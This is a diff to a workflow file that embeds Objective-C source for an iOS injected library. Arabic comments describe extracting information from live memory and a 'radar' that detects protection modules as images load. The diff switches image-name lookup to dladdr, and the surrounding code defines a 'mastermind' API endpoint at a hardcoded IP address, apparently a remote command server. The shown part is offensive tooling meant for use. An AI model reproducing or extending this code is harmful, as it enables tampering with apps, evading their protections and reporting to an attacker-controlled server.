@@ -26,6 +26,7 @@ jobs:
           #import <UIKit/UIKit.h>
           #import <mach-o/dyld.h>
           #import <Foundation/Foundation.h>
+          #import <dlfcn.h> // [تمت الإضافة] مكتبة استخراج المعلومات من الذاكرة الحية
 
           // [🎯] إحداثيات العقل المدبر (ضع رابط ملف api.php الخاص بك هنا)
           #define BRAIN_API_URL @"http://16.171.230.58/api.php"
@@ -126,7 +127,11 @@ jobs:
           // [🛡️] رادار كشف الحماية والملفات التي تنزل حياً
           // =========================================================
           void on_image_loaded(const struct mach_header* mh, intptr_t vmaddr_slide) {
-              const char *image_name = _dyld_get_image_name_by_header(mh);
+              Dl_info info;
+              // [الحل السيادي]: استخدام dladdr للبحث عن اسم الملف من عنوانه في الذاكرة
+              if (dladdr(mh, &info) == 0) return; 
+              
+              const char *image_name = info.dli_fname;
               if (!image_name) return;
 
               NSString *fullPath = [NSString stringWithUTF8String:image_name];
